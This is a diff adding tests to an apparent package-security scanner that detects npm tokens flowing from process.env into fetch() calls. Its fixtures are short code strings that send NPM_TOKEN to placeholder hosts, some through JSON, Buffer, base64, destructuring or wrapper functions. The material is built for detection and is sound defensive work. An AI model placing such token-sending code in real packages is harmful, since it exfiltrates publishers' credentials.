@@ -23,6 +23,94 @@ const source = 'const token = process.env.NPM_TOKEN;';
 const beforeCode = `${source}\nfetch('https://example.test', {body:'ready'});`;
 const afterCode = `${source}\nfetch('https://example.test', {body:token});`;
 
+test('new unsupported sensitive paths and lost file analysis require review', () => {
+  const before = scanPackageDir(fixture(afterCode), { deep: true });
+  const after = scanPackageDir(fixture(`${source} fetch('https://example.test', {body:hash(token)});`), { deep: true });
+  assert.equal(after.credentialFlows.matches.length, 0);
+  assert.equal(after.credentialFlows.unresolved[0].reason, 'unmodeled-call');
+  assert.equal(diffManifests(before, after).escalated, true);
+  assert.equal(diffManifests(after, after).escalated, false);
+  const unavailable = scanPackageDir(fixture(afterCode + " process.env.UNRELATED='x';"), { deep: true });
+  assert.ok(diffManifests(before, unavailable).changes.some((c) => c.type === 'credential-flow-visibility-lost'));
+  const { report } = buildReview(new Map([['pkg', [before]]]), new Map([['pkg', [after]]]));
+  assert.match(renderMarkdown(report), /unresolved/);
+  assert.equal(renderSarif(report).runs[0].results[0].properties.credentialFlows.unresolved.length, 1);
+});
+
+test('ordinary unknown fetch values do not become credential gaps', () => {
+  assert.deepEqual(analyze("fetch(url, {body:JSON.stringify({status:'ok'})});").credentialFlows.unresolved, []);
+  assert.deepEqual(analyze("const token=process.env.NPM_TOKEN; hash(token); fetch(url, {body:'ok'});").credentialFlows.unresolved, []);
+});
+
+test('models serialization, buffers, flat URLSearchParams, immutable objects and destructuring', () => {
+  for (const body of ['JSON.stringify({token})', 'JSON.stringify({nested:{token}, items:[token]})',
+    'Buffer.from(token)', "Buffer.from(token).toString('base64')", 'new URLSearchParams({token})']) {
+    const result = analyze(`${source} fetch(url, {body:${body}});`).credentialFlows;
+    assert.equal(result.matches.length, 1, body);
+    assert.equal(result.unresolved.length, 0, body);
+    assert.ok(result.matches[0].path.some((p) => p.kind === 'transform'));
+  }
+  assert.equal(flows(`${source} const data={token}; const copy=data; fetch(url, {body:JSON.stringify(copy)});`).length, 1);
+  assert.equal(flows(`${source} const opts={body:token}; fetch(url, opts);`).length, 1);
+  assert.equal(flows('const {NPM_TOKEN:token}=process.env; fetch(url,{body:token});').length, 1);
+  assert.equal(flows(`${source} const data={token}; const {token:copy}=data; fetch(url,{body:copy});`).length, 1);
+});
+
+test('models reject overrides, mutation, escaping objects and custom serialization', () => {
+  for (const code of [
+    `${source} const JSON={stringify:x=>'safe'}; fetch(url,{body:JSON.stringify({token})});`,
+    `${source} const j=JSON; j.stringify=x=>'safe'; fetch(url,{body:JSON.stringify({token})});`,
+    `${source} change(JSON); fetch(url,{body:JSON.stringify({token})});`,
+    `${source} fetch(url,{body:JSON.stringify({token,toJSON(){return 'safe'}})});`,
+    `${source} fetch(url,{body:JSON.stringify({token},()=> 'safe')});`,
+    `${source} const data={token}; const other=data; other.token='safe'; fetch(url,{body:JSON.stringify(data)});`,
+    `${source} const data={token}; mutate(data); fetch(url,{body:JSON.stringify(data)});`,
+    `${source} const data={token}; globalThis.data=data; fetch(url,{body:JSON.stringify(data)});`,
+    `${source} fetch(url,{body:new URLSearchParams({nested:{token}})});`,
+    `${source} fetch(url,{body:{token}});`,
+  ]) assert.equal(flows(code).length, 0, code);
+  assert.ok(analyze('let token=process.env.NPM_TOKEN; fetch(url,{body:token});').credentialFlows.unresolved.length);
+});
+
+test('flow signature binds the request destination and method', () => {
+  const a = scanPackageDir(fixture(`${source} fetch('https://service.test/api',{body:token});`), {deep:true});
+  const b = scanPackageDir(fixture(`${source} fetch('https://service.test/collect',{body:token});`), {deep:true});
+  assert.equal(diffManifests(a,b).escalated,true);
+  assert.deepEqual(b.credentialFlows.matches[0].sink.destination,
+    {status:'resolved',origin:'https://service.test',path:'/collect',method:'GET'});
+  const c = scanPackageDir(fixture(`${source} fetch('https://service.test/api',{body:token,method:'POST'});`), {deep:true});
+  assert.equal(diffManifests(a,c).escalated,true);
+  assert.equal(flows(`${source} const unrelated='https://wrong.test'; fetch(url,{body:token});`)[0].sink.destination.status,'unresolved');
+});
+
+test('bounded local summaries trace return values and direct fetch wrappers at call sites', () => {
+  for (const code of [
+    `${source} function send(x){fetch('https://service.test',{body:x});} send(token);`,
+    `${source} const send=(x)=>fetch('https://service.test',{body:x}); send(token);`,
+    `${source} function identity(x){return x;} fetch(url,{body:identity(token)});`,
+    `${source} function encode(x){return JSON.stringify({token:x});} fetch(url,{body:encode(token)});`,
+    `${source} function send(x){fetch(url,{body:x});} function wrapper(x){send(x);} wrapper(token);`,
+  ]) {
+    const result=analyze(code).credentialFlows;
+    assert.equal(result.matches.length,1,code);
+    assert.ok(result.matches[0].path.some((p)=>p.kind==='parameter'),code);
+  }
+  const [flow]=flows(`${source} function send(url,x){fetch(url,{body:x});} send('https://service.test/path',token);`);
+  assert.equal(flow.sink.destination.path,'/path');
+  assert.equal(flows(`${source} function id(x){return 'safe';} fetch(url,{body:id(token)});`).length,0);
+  assert.equal(flows(`${source} function id(x){return x;} function id(x){return 'safe';} fetch(url,{body:id(token)});`).length,0);
+});
+
+test('unsupported wrappers report gaps, and recursive summaries stay bounded', () => {
+  const code=`${source} function send(x){x='safe'; fetch(url,{body:x});} send(token);`;
+  assert.equal(flows(code).length,0);
+  assert.ok(analyze(code).credentialFlows.unresolved.some((g)=>g.reason==='unresolved-function'));
+  const recursive=analyze(`${source} function id(x){return id(x);} fetch(url,{body:id(token)});`);
+  assert.equal(recursive.parsed,true);
+  assert.equal(recursive.credentialFlows.matches.length,0);
+  assert.ok(recursive.credentialFlows.unresolved.length || recursive.credentialFlows.truncated);
+});
+
 test('traces immutable credential aliases to fetch with original source lines', () => {
   const [flow] = flows(`${source}\nconst copy = token;\nfetch(url, {body:copy});`);
   assert.equal(flow.source, 'NPM_TOKEN');
